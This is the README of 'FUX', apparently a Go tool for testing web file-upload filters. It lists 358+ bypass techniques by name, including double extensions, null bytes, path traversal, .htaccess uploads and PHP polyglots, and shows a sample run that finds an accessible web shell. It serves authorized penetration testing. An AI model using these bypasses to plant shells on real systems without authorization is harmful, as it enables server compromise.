<p align="center">
  <img src="https://img.shields.io/badge/Version-1.1.0-blue.svg" alt="Version">
  <img src="https://img.shields.io/badge/Go-1.21+-00ADD8.svg" alt="Go">
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey.svg" alt="Platform">
  <img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License">
</p>

```
    ███████╗██╗   ██╗██╗  ██╗
    ██╔════╝██║   ██║╚██╗██╔╝
    █████╗  ██║   ██║ ╚███╔╝ 
    ██╔══╝  ██║   ██║ ██╔██╗ 
    ██║     ╚██████╔╝██╔╝ ██╗
    ╚═╝      ╚═════╝ ╚═╝  ╚═╝
```

# FUX - File Upload eXploiter

**FUX** is an advanced file upload vulnerability scanner that automatically tests various bypass techniques to identify insecure file upload implementations. It accepts raw HTTP requests from tools like Burp Suite or Caido and attempts to bypass security filters using **358+ different payloads**.

## 🎯 Features

- **358+ Bypass Payloads** - Extension, MIME type, magic bytes, filename obfuscation, content obfuscation, and polyglot files
- **Raw Request Support** - Direct import from Burp Suite / Caido
- **Custom Match Detection** - Define your own success/failure strings
- **Multi-threaded** - Fast concurrent scanning with configurable threads
- **Proxy Support** - Route traffic through Burp/ZAP for analysis
- **Smart Detection** - Automatic success/failure detection with false positive filtering
- **JSON Output** - Export results for further processing
- **Progress Tracking** - Real-time progress indicator
- **Upload Verification** - Optionally verify if uploaded files are accessible

## 📦 Installation

### From Source (Recommended for Kali/Parrot Linux)

```bash
# Clone the repository
git clone https://github.com/yourusername/fux.git
cd fux

# Build the binary
go build -o fux .

# Move to PATH (optional)
sudo mv fux /usr/local/bin/

# Verify installation
fux -h
```

### Prerequisites

- **Go 1.21+** must be installed

```bash
# Install Go on Kali/Parrot/Debian
sudo apt update
sudo apt install -y golang

# Or download latest from https://go.dev/dl/
wget https://go.dev/dl/go1.21.6.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.6.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
```

## 🚀 Usage

### Basic Usage

```bash
# Simple scan with raw request file
fux -r request.txt

# With custom success detection (RECOMMENDED)
fux -r request.txt -mr "upload successful"

# Verbose output
fux -r request.txt -mr "success" -v
```

### Preparing the Request File

1. Capture a file upload request in **Burp Suite** or **Caido**
2. Right-click → **Copy to file** or **Save item**
3. Use the saved file with FUX

Example `request.txt`:
```http
POST /upload.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cookie: session=abc123

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

[FILE_CONTENT]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

### Advanced Examples

```bash
# With proxy (Burp Suite)
fux -r request.txt -mr "uploaded" -proxy http://127.0.0.1:8080

# Rate-limited scan (100ms delay between requests)
fux -r request.txt -mr "success" -delay 100 -t 5

# Only test extension bypasses
fux -r request.txt -mr "success" -category extension

# Filter false positives
fux -r request.txt -mr "success" -nmr "error"

# Save results to JSON
fux -r request.txt -mr "uploaded" -o results.json

# Verify uploaded files are accessible
fux -r request.txt -mr "success" -verify

# Full featured scan
fux -r request.txt -mr "uploaded successfully" -nmr "not allowed" \
    -proxy http://127.0.0.1:8080 -t 20 -delay 50 -v -verify -o output.json
```

## ⚙️ Options

| Flag | Description |
|------|-------------|
| `-r` | Raw HTTP request file (required) |
| `-u` | Target URL (overrides Host header) |
| `-p` | File parameter name (auto-detected) |
| `-mr` | Match response text for success detection |
| `-match` | Alias for -mr |
| `-nmr` | Not match - if found, consider it failed |
| `-mre` | Match regex pattern for success detection |
| `-t` | Number of threads (default: 10) |
| `-delay` | Delay between requests in ms (default: 0) |
| `-timeout` | Request timeout in seconds (default: 15) |
| `-proxy` | Proxy URL (e.g., http://127.0.0.1:8080) |
| `-category` | Only run specific category |
| `-skip-ext` | Skip extension payloads |
| `-skip-mime` | Skip MIME type payloads |
| `-skip-magic` | Skip magic bytes payloads |
| `-skip-filename` | Skip filename obfuscation payloads |
| `-skip-content` | Skip content obfuscation payloads |
| `-skip-polyglot` | Skip polyglot payloads |
| `-verify` | Verify uploaded files are accessible |
| `-random-agent` | Randomize User-Agent |
| `-o` | Output file (JSON format) |
| `-v` | Verbose output |

## 🔥 Bypass Categories

### 1. Extension Bypasses (80+ payloads)
- PHP alternatives: `.php3`, `.php5`, `.phtml`, `.phar`, `.pgif`
- Double extensions: `shell.php.jpg`, `shell.jpg.php`
- Null byte: `shell.php%00.jpg`
- Case variations: `shell.PHP`, `shell.pHp`
- Special chars: `shell.php.`, `shell.php%20`
- ASP/JSP/SSI extensions
- Config files: `.htaccess`, `.user.ini`, `web.config`

### 2. MIME Type Bypasses (100+ payloads)
- Image MIME with PHP extension
- Charset variations
- Invalid MIME types

### 3. Magic Bytes (50+ payloads)
- JPEG, PNG, GIF, BMP headers with PHP content
- EXIF injection
- PNG tEXt chunk injection
- SVG with XSS/XXE

### 4. Filename Obfuscation (60+ payloads)
- Path traversal: `../shell.php`
- URL encoding
- Unicode tricks
- RTLO (Right-to-Left Override)
- NTFS streams: `shell.php::$DATA`

### 5. Content Obfuscation (60+ payloads)
- PHP tag variations
- Base64/ROT13 obfuscation
- Whitespace injection
- Various PHP functions

### 6. Polyglot Files (15+ payloads)
- JPEG/PHP polyglot
- GIF/PHP polyglot
- PNG/PHP polyglot
- PDF/PHP polyglot
- PHAR/JPEG polyglot

## 📊 Output Example

```
    ███████╗██╗   ██╗██╗  ██╗
    ██╔════╝██║   ██║╚██╗██╔╝
    █████╗  ██║   ██║ ╚███╔╝ 
    ██╔══╝  ██║   ██║ ██╔██╗ 
    ██║     ╚██████╔╝██╔╝ ██╗
    ╚═╝      ╚═════╝ ╚═╝  ╚═╝
    File Upload eXploiter v1.1.0

[*] Configuration:
    Target: https://target.com/upload.php
    File Param: file
    Threads: 10
    Match String: upload successful

[*] Target URL: https://target.com/upload.php
[*] Loaded Payloads: 358
[*] Starting scan at 15:30:45

[+] FOUND: Double Extension: shell.php.jpg
    Category: double-extension
    File: shell.php.jpg
    MIME: application/x-php
    Status: 200 | Size: 156 bytes
    Path: /uploads/shell.php.jpg
    [VERIFIED] Shell is accessible!
    Time: 245ms

══════════════════════════════════════════════
[*] Scan Complete
══════════════════════════════════════════════
    Duration: 45s
    Total Payloads: 358
    Completed: 358

    [!] Successful Uploads: 3
    [!] Unique Bypasses: 2
```

## 🛡️ Legal Disclaimer

This tool is intended for **authorized security testing only**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

The authors are not responsible for any misuse or damage caused by this tool.

## 📝 License

MIT License - See [LICENSE](LICENSE) file for details.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit pull requests.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing`)
5. Open a Pull Request

## 📧 Contact

For bugs, feature requests, or questions, please open an issue on GitHub.

---

<p align="center">
  Made with ❤️ for the security community
</p>
